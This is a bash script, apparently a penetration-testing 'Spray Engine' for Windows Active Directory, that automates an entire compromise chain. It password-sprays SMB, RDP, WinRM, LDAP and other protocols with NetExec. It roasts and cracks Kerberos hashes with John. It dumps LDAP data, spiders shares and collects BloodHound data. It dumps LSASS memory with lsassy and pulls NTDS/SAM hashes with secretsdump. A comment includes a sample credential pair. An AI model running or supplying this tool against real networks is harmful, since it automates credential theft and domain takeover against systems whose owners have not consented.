#!/bin/bash

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
GRAY='\033[1;30m'
NC='\033[0m'

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_auth_spray.txt"
CLEAN_OUT="$OUTDIR/final_auth_success.txt"
SPIDER_DIR="$OUTDIR/spider_plus"
BROKEN_PIPE_LOG="$OUTDIR/broken_pipe_hosts.txt"
USER_EXPORT_OUT="$OUTDIR/final_auth_user.txt"  
DC_INFO="$OUTDIR/dc_domain_mapping.txt"
FINAL_CRACKED="$OUTDIR/final_cracked_asrep_kerberoast.txt"
FINAL_OUT="$OUTDIR/final_summary.txt"

mkdir -p "$OUTDIR" "$SPIDER_DIR"
: > "$BROKEN_PIPE_LOG"
: > "$CLEAN_OUT"
: > "$RAW_OUT"
: > "$FINAL_CRACKED"
: > "$USER_EXPORT_OUT"

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] Spray Engine${NC}"
echo -e "${PURPLE}====================================================${NC}"

for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [[ ! -f "$f" ]] && echo -e "${RED}[!] Error: File '$f' does not exist!${NC}" && exit 1
done

declare -A DC_MAP
declare -A ASREP_DONE
declare -A KERB_DONE
declare -A BH_DONE
declare -A DC_FQDN_MAP
declare -A USER_EXP_DONE

if [[ -s "$DC_INFO" ]]; then
    while IFS=';' read -r dc_ip dc_domain dc_fqdn || [[ -n "$dc_ip" ]]; do
        [[ -z "$dc_ip" || "$dc_ip" =~ ^# ]] && continue
        dc_ip="${dc_ip//[[:space:]]/}"
        dc_domain="${dc_domain//[[:space:]]/}"
        dc_fqdn="${dc_fqdn//[[:space:]]/}"
        DC_MAP["$dc_domain"]="$dc_ip"
        DC_FQDN_MAP["$dc_domain"]="${dc_fqdn:-DC01.$dc_domain}"
    done < "$DC_INFO"
fi

PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")

supports_local_auth() {
    case "$1" in
        smb|winrm|rdp|wmi) return 0 ;;
        *) return 1 ;;
    esac
}

declare -A PROTO_MAP
for proto in "${PROTOCOLS[@]}"; do
    FILE_PROTO="$OUTDIR/active_$proto.txt"
    [[ ! -s "$FILE_PROTO" ]] && continue
    while read -r ip; do
        [[ -z "$ip" ]] && continue
        PROTO_MAP["$ip"]+="$proto "
    done < "$FILE_PROTO"
done

declare -A DOMAIN_CACHE
get_domain() {
    local ip="$1"
    [[ -n "${DOMAIN_CACHE[$ip]}" ]] && { echo "${DOMAIN_CACHE[$ip]}"; return; }
    for d_key in "${!DC_MAP[@]}"; do
        if [[ "${DC_MAP[$d_key]}" == "$ip" ]]; then
            DOMAIN_CACHE[$ip]="$d_key"
            echo "$d_key"
            return
        fi
    done

    local domain="" hostname="" nxc_out

    echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress (domain detection)${NC}" >&2
    nxc_out=$(timeout 15s nxc smb "$ip" --no-progress 2>/dev/null)
    domain=$(echo "$nxc_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
    hostname=$(echo "$nxc_out" | grep -oP '(?<=\(name:)[^)]+' | head -n1)

    if [[ -z "$domain" || "$domain" == "WORKGROUP" ]]; then
        domain="."
    else
        if [[ -z "${DC_MAP[$domain]}" ]]; then
            DC_MAP["$domain"]="$ip"
            DC_FQDN_MAP["$domain"]="${hostname:-DC01}.${domain}"
        fi
    fi
    DOMAIN_CACHE[$ip]="$domain"
    echo "$domain"
}

TMP_RES=".tmp_res_$$"
TMP_SUCCESS=".tmp_success_$$"

# =========================
# MAIN LOOP
# =========================
for ip in "${!PROTO_MAP[@]}"; do
    echo -e "\n${CYAN}>>> Target Host: $ip${NC}"
    DOMAIN=$(get_domain "$ip" | tr -d '\r\n' | xargs)

    if [[ "$DOMAIN" =~ \[|\]|CMD ]]; then
        DOMAIN="."
    fi

    # ===== DOMAIN FALLBACK (IF SMB FAILED) =====
    if [[ "$DOMAIN" == "." ]]; then
        echo -e "${GRAY}[*] SMB failed to detect domain, trying LDAP fallback...${NC}" >&2
        echo -e "${GRAY}[CMD] timeout 10s nxc ldap \"$ip\" --no-progress${NC}" >&2


        ldap_out=$(timeout 10s nxc ldap "$ip" --no-progress 2>/dev/null)
        ldap_domain=$(echo "$ldap_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)

        if [[ -n "$ldap_domain" && "$ldap_domain" != "WORKGROUP" ]]; then
            DOMAIN="$ldap_domain"
            echo -e "${GREEN}[+] Domain recovered via LDAP: $DOMAIN${NC}"
        fi
    fi


    for proto in ${PROTO_MAP[$ip]}; do
        echo -e "\n${BLUE}[+] PROTOCOL: ${proto^^}${NC}"

        DOMAIN_ARG=""
        EXTRA=""

        attempt_spray=1
        max_spray=2

        # ======================================================
        # STEP 1: DEFAULT AUTH (DOMAIN-AWARE)
        # ======================================================
        while [ $attempt_spray -le $max_spray ]; do
            echo -e "${GRAY}[CMD] (Attempt $attempt_spray/$max_spray) nxc $proto $ip -u $USER_FILE -p $PASS_FILE --continue-on-success --no-progress${NC}"

            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" --continue-on-success --no-progress > "$TMP_RES" 2>&1

            TMP_CLEAN="${TMP_RES}.clean"

            sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" \
                | tee -a "$RAW_OUT" \
                | tee "$TMP_CLEAN"

            grep -E "\[\+\]|Pwn3d!" "$TMP_CLEAN" > "$TMP_SUCCESS"

            rm -f "$TMP_CLEAN"

            [[ -s "$TMP_SUCCESS" ]] && break

            if grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
                echo "$ip" >> "$BROKEN_PIPE_LOG"
                ((attempt_spray++)); sleep 1
            else
                break
            fi
        done

       
        # ======================================================
        # STEP 2: LOCAL AUTH FALLBACK
        # ======================================================

        if [[ ! -s "$TMP_SUCCESS" ]] && supports_local_auth "$proto"; then
            echo -e "${GRAY}[CMD] fallback --local-auth${NC}"
            echo -e "${GRAY}[CMD] timeout 45s nxc $proto $ip -u $USER_FILE -p $PASS_FILE --local-auth --continue-on-success --no-progress${NC}"

            timeout 45s nxc "$proto" "$ip" \
                -u "$USER_FILE" -p "$PASS_FILE" \
                --local-auth --continue-on-success --no-progress \
                > "$TMP_RES" 2>&1   

            # ✅ sanitize + log + display
            sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" \
                | tee -a "$RAW_OUT" \
                | tee "$TMP_RES.clean"

            # ✅ extract success
            grep -E "\[\+\]|Pwn3d!" "$TMP_RES.clean" > "$TMP_SUCCESS"

            rm -f "$TMP_RES.clean"
        fi


        # ======================================================
        # Falback DOMAIN
        # ======================================================
        if [[ ! -s "$TMP_SUCCESS" && "$DOMAIN" != "." ]]; then
            echo -e "${PURPLE}[EXEC] Trying explicit domain auth${NC}"
            echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" -d \"$DOMAIN\" --continue-on-success --no-progress${NC}"

            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress | tee "$TMP_RES"

            TMP_CLEAN="${TMP_RES}.clean"

            sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" \
                | tee -a "$RAW_OUT" \
                | tee "$TMP_CLEAN"

            grep -E "\[\+\]|Pwn3d!" "$TMP_CLEAN" > "$TMP_SUCCESS"

            rm -f "$TMP_CLEAN"


            [[ -s "$TMP_SUCCESS" ]] && DOMAIN_ARG="-d $DOMAIN"
        fi

        # -----------------------------------------------------------------
        # STEP 3: DYNAMIC MULTI-CREDENTIAL PARSING & POST-EXPLOIT
        # -----------------------------------------------------------------
        if [[ -s "$TMP_SUCCESS" ]]; then
            while IFS= read -r line; do
                [[ -z "$line" ]] && continue
                
                RAW_CRED=$(echo "$line" | sed -n 's/.*\[+\] \([^ ]*\).*/\1/p')
                u_p="${RAW_CRED#*\\}"      
                u="${u_p%%:*}"
                p="${u_p#"$u":}"        

                if [[ -n "$u" && -n "$p" ]]; then
                    echo -e "${GREEN}[!] Valid Credentials Found -> $u:$p${NC}"
                    echo "[$proto] $ip - [+] Valid Credentials Found -> $u:$p" >> "$CLEAN_OUT"
                    if echo "$line" | grep -qi "Pwn3d!"; then
                        echo "[$proto] $ip - [!!!] Pwn3d! Status Achieved for $u" >> "$CLEAN_OUT"
                    fi
                fi
            done < "$TMP_SUCCESS"

            BEST_LINE=$(grep -i "Pwn3d!" "$TMP_SUCCESS" | head -n1)
            [[ -z "$BEST_LINE" ]] && BEST_LINE=$(head -n1 "$TMP_SUCCESS")
            
            RAW_CRED=$(echo "$BEST_LINE" | sed -n 's/.*\[+\] \([^ ]*\).*/\1/p')
            user_pass="${RAW_CRED#*\\}"
            user="${user_pass%%:*}"
            pass="${user_pass#*:}"
            
            dc_ip="${DC_MAP[$DOMAIN]}"

            # --- ROASTING ENGINE ---
            if [[ -n "$dc_ip" && "$DOMAIN" != "." ]]; then
                if [[ -z "${ASREP_DONE[$DOMAIN]}" ]]; then
                    ASREP_DONE[$DOMAIN]=1
                    ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
                    echo -e "${PURPLE}[EXEC] Running ASREP Roasting → $DOMAIN ($dc_ip)${NC}"
                    echo -e "${GRAY}[CMD] timeout 40s impacket-GetNPUsers \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -format hashcat -outputfile \"$ASREP_HASH_FILE\"${NC}"
                    timeout 40s impacket-GetNPUsers "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -format hashcat -outputfile "$ASREP_HASH_FILE" 2>&1 | tee "$OUTDIR/asrep_raw.log"
                    
                    if [[ -s "$ASREP_HASH_FILE" ]]; then
                        echo -e "${RED}[!] ASREP hash found! Cracking with John...${NC}"
                        echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$ASREP_HASH_FILE\"${NC}"
                        timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$ASREP_HASH_FILE" 
                        ASREP_RESULT=$(john --show "$ASREP_HASH_FILE" | grep -v "password cracked" | grep ":")
                        if [[ -n "$ASREP_RESULT" ]]; then
                            echo -e "${GREEN}[+++] SUCCESS! Cracked ASREP Hash(es):\n${YELLOW}$ASREP_RESULT${NC}"
                            echo -e "\n[ASREP - $DOMAIN]\n$ASREP_RESULT" >> "$FINAL_CRACKED"
                        fi
                    fi
                fi

                if [[ -z "${KERB_DONE[$DOMAIN]}" ]]; then
                    KERB_DONE[$DOMAIN]=1
                    KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
                    echo -e "${PURPLE}[EXEC] Running Kerberoasting → $DOMAIN ($dc_ip)${NC}"
                    echo -e "${GRAY}[CMD] timeout 40s impacket-GetUserSPNs \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -outputfile \"$KERB_HASH_FILE\"${NC}"
                    timeout 40s impacket-GetUserSPNs "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -outputfile "$KERB_HASH_FILE" 2>&1 | tee "$OUTDIR/kerberoast_raw.log"
                    
                    if [[ -s "$KERB_HASH_FILE" ]]; then
                        echo -e "${RED}[!] Kerberoast hash found! Cracking with John...${NC}"
                        echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$KERB_HASH_FILE\"${NC}"
                        timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$KERB_HASH_FILE" 
                        KERB_RESULT=$(john --show "$KERB_HASH_FILE" | grep -v "password cracked" | grep ":")
                        if [[ -n "$KERB_RESULT" ]]; then
                            echo -e "${GREEN}[+++] SUCCESS! Cracked Kerberoast Hash(es):\n${YELLOW}$KERB_RESULT${NC}"
                            echo -e "\n[KERBEROAST - $DOMAIN]\n$KERB_RESULT" >> "$FINAL_CRACKED"
                        fi
                    fi
                fi
            fi

            # --- LDAP POST-EXPLOIT ---
            if [[ "$proto" == "ldap" ]]; then
                DUMP_PATH="$OUTDIR/ldap_$ip"
                mkdir -p "$DUMP_PATH"

                echo "[DEBUG] RAW DOMAIN: $DOMAIN"
                echo "[DEBUG] RAW USER: $user"

                LDAP_USER="$user"

                if [[ "$DOMAIN" != "." ]]; then
                    LDAP_USER=$(printf '%s\\%s' "$DOMAIN" "$user")
                fi
                echo "[DEBUG] FINAL LDAP_USER: $LDAP_USER"
                echo -e "${YELLOW}[!] Executing ldapdomaindump...${NC}"
                echo -e "${GRAY}[CMD] timeout 60s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\"${NC}"
                timeout 60s ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" 
                # === EXPORT USERS VIA LDAP (HANYA JIKA SMB BELUM BERHASIL) ===
                if [[ "$DOMAIN" != "." && -z "${USER_EXP_DONE[$DOMAIN]}" ]]; then
                    echo -e "${YELLOW}[!] SMB export missed or skipped. Exporting users via LDAP for domain $DOMAIN...${NC}"
                    echo -e "${GRAY}[CMD] timeout 40s nxc ldap $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                    timeout 40s nxc ldap "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" 
                    if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                        cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                        rm -f "$USER_EXPORT_OUT.tmp"
                        USER_EXP_DONE[$DOMAIN]=1  # <-- Kunci domain ini
                        echo -e "${GREEN}[+] Successfully exported users via LDAP for $DOMAIN.${NC}"
                    fi
                fi

            fi

            # --- SMB POST-EXPLOIT---
            
            if [[ "$proto" == "smb" ]]; then

                # ===== USERS EXPORT (DOMAIN ONLY) =====
                if [[ "$DOMAIN" != "." && -z "${USER_EXP_DONE[$DOMAIN]}" ]]; then
                    echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
                    echo -e "${GRAY}[CMD] timeout 40s nxc smb $ip -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"

                    timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp"

                    if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                        cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                        rm -f "$USER_EXPORT_OUT.tmp"
                        USER_EXP_DONE[$DOMAIN]=1
                        echo -e "${GREEN}[+] SMB user export success for $DOMAIN${NC}"
                    fi
                fi
    


                ABS_SPIDER=$(readlink -f "$SPIDER_DIR")

                # ---------- SPIDER ----------
                echo -e "${RED}[EXEC] Running spider_plus module${NC}"
                echo -e "${GRAY}[CMD] timeout 60s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M spider_plus${NC}"
                if [[ "$DOMAIN" != "." ]]; then
                    timeout 60s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"

                    if ! grep -qi "accessible" "$TMP_RES"; then
                        timeout 60s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
                    fi
                else
                    timeout 60s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
                fi

                # ---------- NOPAC ----------
                echo -e "${RED}[EXEC] Running nopac module${NC}"
                echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M nopac${NC}"
                if [[ "$DOMAIN" != "." ]]; then
                    timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac | tee "$TMP_RES"
                    if ! grep -qi "VULNERABLE" "$TMP_RES"; then
                        timeout 30s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M nopac | tee "$TMP_RES"
                    fi
                else
                    timeout 30s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M nopac | tee "$TMP_RES"
                fi

                # ---------- NTLM REFLECTION ----------
                echo -e "${RED}[EXEC] Running ntlm_reflection module${NC}"
                echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M ntlm_reflection${NC}"
                if [[ "$DOMAIN" != "." ]]; then
                    timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection | tee "$TMP_RES"
                    if ! grep -qi "vulnerable" "$TMP_RES"; then
                        timeout 30s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M ntlm_reflection | tee "$TMP_RES"
                    fi
                else
                    timeout 30s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M ntlm_reflection | tee "$TMP_RES"
                fi
                echo "[DEBUG] BH check: DOMAIN=$DOMAIN DC_IP=$dc_ip BH_DONE=${BH_DONE[$DOMAIN]}"
                # ---------- BLOODHOUND (DOMAIN ONLY) ----------
                if [[ -z "${BH_DONE[$DOMAIN]}" && "$DOMAIN" != "." ]]; then
                    echo "[DEBUG] Passed BH condition (first run for domain)"
                    if mkdir "$OUTDIR/lock_bh_${DOMAIN}" 2>/dev/null; then
                        echo "[DEBUG] Lock acquired: $OUTDIR/lock_bh_${DOMAIN}"
                        BH_DIR="$OUTDIR/bloodhound_${ip}"
                        mkdir -p "$BH_DIR"
                        echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
                        (
                            cd "$BH_DIR" || exit
                            echo "[CMD] timeout 150s bloodhound-ce-python -d \"$DOMAIN\" -dc \"${DC_FQDN_MAP[$DOMAIN]}\" -u \"$user\" -p \"$pass\" -ns \"$dc_ip\" -c all --zip"
                            timeout 150s bloodhound-ce-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$dc_ip" -c all --zip | tee bloodhound_run.log
                            echo "[DEBUG] BloodHound finished with exit code: $?"
                        )

                    else
                        echo "[DEBUG] SKIPPED BloodHound → lock folder already exists"

                    fi

                else
                    echo "[DEBUG] SKIPPED BloodHound → condition not met"
                fi

                # ---------- LSASSY ----------
                if echo "$BEST_LINE" | grep -qi "Pwn3d!"; then
                    echo -e "${RED}[EXEC] Running lsassy${NC}"

                    if [[ "$DOMAIN" != "." ]]; then
                        echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M lsassy${NC}"
                        timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M lsassy | tee "$TMP_RES"

                        if ! grep -qiE "dumped|success" "$TMP_RES"; then
                            echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" --local-auth -M lsassy${NC}"
                            timeout 40s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M lsassy | tee "$TMP_RES"
                        fi
                    else
                        echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" --local-auth -M lsassy${NC}"
                        timeout 40s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M lsassy | tee "$TMP_RES"
                    fi

                    if grep -qiE "dumped|success" "$TMP_RES"; then
                        echo "[$proto] $ip - [LSASS] Dump success" >> "$CLEAN_OUT"
                        cat "$TMP_RES" >> "$OUTDIR/lsassy_loot.txt"
                    fi

                fi
            fi

        fi
    done
done

rm -f "$TMP_RES" "$TMP_SUCCESS"

# =================================================================
# CLEANUP & USER DUMP SORTING
# =================================================================
if [[ -s "$USER_EXPORT_OUT" ]]; then
    # Menghapus spasi kosong yang tidak sengaja terbawa (opsional tapi aman)
    sed -i '/^[[:space:]]*$/d' "$USER_EXPORT_OUT"
    
    # Melakukan sorting, mengambil nilai unik (sort -u), dan menimpa file aslinya
    sort -u "$USER_EXPORT_OUT" -o "$USER_EXPORT_OUT"
    
    # Menghitung jumlah user unik yang berhasil didapatkan
    TOTAL_USERS=$(wc -l < "$USER_EXPORT_OUT")
    
    echo -e "${GREEN}[+] Consolidated $TOTAL_USERS unique users from SMB/LDAP into:${NC}"
    echo -e "${YELLOW}---> $USER_EXPORT_OUT${NC}\n"
else
    echo -e "\n${YELLOW}[!] No users were exported from any domain targets.${NC}\n"
fi

# =================================================================
# PHASE 4: FINAL CHRONOLOGICAL SUMMARY
# =================================================================
echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 4: FINAL CHRONOLOGICAL SUMMARY${NC}"
echo -e "${PURPLE}====================================================${NC}"

: > "$FINAL_OUT"

if [[ -s "$RAW_OUT" ]]; then
    grep -aEi "\[\*\]|LSASSY|VULN|TGT with|PetitPotam|DFSCoerce" "$RAW_OUT" | awk '!seen[$0]++' >> "$FINAL_OUT"
fi

if [[ -s "$CLEAN_OUT" ]]; then
    cat "$CLEAN_OUT" >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_CRACKED" ]]; then
    echo -e "\n--- CRACKED CREDENTIALS (JOHN THE RIPPER) ---" >> "$FINAL_OUT"
    cat "$FINAL_CRACKED" >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_OUT" ]]; then
    while IFS= read -r line; do
        if [[ "$line" == *"[+]"* || "$line" == *"Valid Credentials"* ]]; then
            echo -e "${GREEN}${line}${NC}"
        elif [[ "$line" == *"[!!!]"* || "$line" == *"[LSASS]"* ]]; then
            echo -e "${RED}${line}${NC}"
        elif [[ "$line" == *"[*]"* ]]; then
            echo -e "${BLUE}${line}${NC}"
        else
            echo -e "${YELLOW}${line}${NC}"
        fi
    done < "$FINAL_OUT"
else
    echo -e "${YELLOW}[!] No summary records found.${NC}"
fi
# =================================================================
# EXTRACTION: UNIQUE VALID CREDENTIALS TO Final_valid_creds.txt
# =================================================================
FINAL_CREDS_FILE="$OUTDIR/final_valid_creds_all.txt"
: > "$FINAL_CREDS_FILE"

if [[ -s "$FINAL_OUT" ]]; then
    # Mengambil baris yang memiliki pola kredensial valid
    # Contoh input: [winrm] 10.0.16.179 - [+] Valid Credentials Found -> ATHENA_SVC:1dirtymartini
    # Hasil output: 10.0.16.179;ATHENA_SVC:1dirtymartini
    grep -a "Valid Credentials Found" "$FINAL_OUT" | awk -F'-> ' '{print $1, $2}' | awk '{print $2 ";" $NF}' | sort -u > "$FINAL_CREDS_FILE"

    if [[ -s "$FINAL_CREDS_FILE" ]]; then
        TOTAL_CREDS=$(wc -l < "$FINAL_CREDS_FILE")
        echo -e "\n${GREEN}[+] Successfully extracted $TOTAL_CREDS unique credentials into:${NC}"
        echo -e "${YELLOW}---> $FINAL_CREDS_FILE${NC}"
        echo -e "${GRAY}------------------------------------------------------------${NC}"
        cat "$FINAL_CREDS_FILE"
        echo -e "${GRAY}------------------------------------------------------------${NC}"
    fi
fi

#====================================================
# PHASE 5: AUTOMATIC NTDS DUMPING (Secretsdump)
#====================================================
if [[ -s "$FINAL_CREDS_FILE" ]]; then
    
    # File temporary untuk mencatat IP DC yang SUDAH BERHASIL di-dump
    DUMPED_IPS_TRACKER="$OUTDIR/.dumped_ips.tmp"
    : > "$DUMPED_IPS_TRACKER"
    
    while IFS=; read -r cred_line || [[ -n "$cred_line" ]]; do
        [[ -z "$cred_line" ]] && continue
        
        # Ekstraksi komponen kredensial
        ip=$(echo "$cred_line" | cut -d';' -f1)
        user_pass=$(echo "$cred_line" | cut -d';' -f2)
        cred_user=$(echo "$user_pass" | cut -d':' -f1)
        cred_pass=$(echo "$user_pass" | cut -d':' -f2)
        
        # -----------------------------------------------------------
        # MASALAH 2 FIX: Cek apakah IP ini sudah sukses di-dump sebelumnya
        # -----------------------------------------------------------
        if grep -q "^$ip$" "$DUMPED_IPS_TRACKER" 2>/dev/null; then
            echo -e "${GRAY}[*] Skipping $ip using $cred_user - NTDS already successfully dumped for this host.${NC}"
            continue
        fi
    
        DOMAIN=$(get_domain "$ip" | tr -d '\r\n' | xargs)

        if [[ "$DOMAIN" =~ \[|\]|CMD ]]; then
            DOMAIN="."
        fi

        # ===== DOMAIN FALLBACK (IF SMB FAILED) =====
        if [[ "$DOMAIN" == "." ]]; then
            echo -e "${GRAY}[*] SMB failed to detect domain, trying LDAP fallback...${NC}" >&2
            echo -e "${GRAY}[CMD] timeout 10s nxc ldap \"$ip\" --no-progress${NC}" >&2

            ldap_out=$(timeout 10s nxc ldap "$ip" --no-progress 2>/dev/null)
            ldap_domain=$(echo "$ldap_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)

            if [[ -n "$ldap_domain" && "$ldap_domain" != "WORKGROUP" ]]; then
                DOMAIN="$ldap_domain"
                echo -e "${GREEN}[+] Domain recovered via LDAP: $DOMAIN${NC}"
            fi
        fi


        # BUILD TARGET
        if [[ "$DOMAIN" == "." ]]; then
            TARGET="$cred_user:$cred_pass@$ip"
        else
            TARGET="$DOMAIN/$cred_user:$cred_pass@$ip"
        fi

        dump_out_name="$OUTDIR/secretsdump_${DOMAIN}_${ip}_${cred_user}"

        # --- JUST-DC ---

        echo -e "${GRAY}[CMD] secretsdump -just-dc $TARGET${NC}"

        timeout 120s impacket-secretsdump -just-dc "$TARGET" -outputfile "$dump_out_name" | tee -a "$OUTDIR/secretsdump_run.log"

        # CHECK
        if [[ -s "${dump_out_name}.ntds" ]] && grep -q ":::" "${dump_out_name}.ntds"; then
            echo -e "${GREEN}[+] NTDS dumped${NC}"
            echo "$ip" >> "$DUMPED_IPS_TRACKER"

        else
            echo -e "${YELLOW}[!] fallback full dump${NC}"
            echo -e "${GRAY}[CMD] timeout 180s impacket-secretsdump \"$TARGET\" -outputfile \"$dump_out_name\"${NC}"
            timeout 180s impacket-secretsdump "$TARGET" -outputfile "$dump_out_name" | tee -a "$OUTDIR/secretsdump_run.log"

            if [[ -s "${dump_out_name}.sam" || -s "${dump_out_name}.secrets" ]]; then
                echo -e "${GREEN}[+] SAM/LSA dumped${NC}"
                echo "$ip" >> "$DUMPED_IPS_TRACKER"
            else
                echo -e "${RED}[-] dump failed${NC}"
                # Membersihkan file sampah/kosong hasil generate impacket yang gagal
                rm -f "${dump_out_name}.ntds" 2>/dev/null
            fi
        fi
        
        echo -e "${BLUE}-------------------------------${NC}"
        
    done < "$FINAL_CREDS_FILE"
    
    # Hapus file tracker setelah selesai phase 5
    rm -f "$DUMPED_IPS_TRACKER"
fi

if [[ -s "$BROKEN_PIPE_LOG" ]]; then
    echo -e "\n${RED}[!] HOSTS WITH CONNECTION TIMEOUTS / BROKEN PIPE:${NC}"
    echo -e "${GRAY}------------------------------------------------------------${NC}"
    cat "$BROKEN_PIPE_LOG"
fi
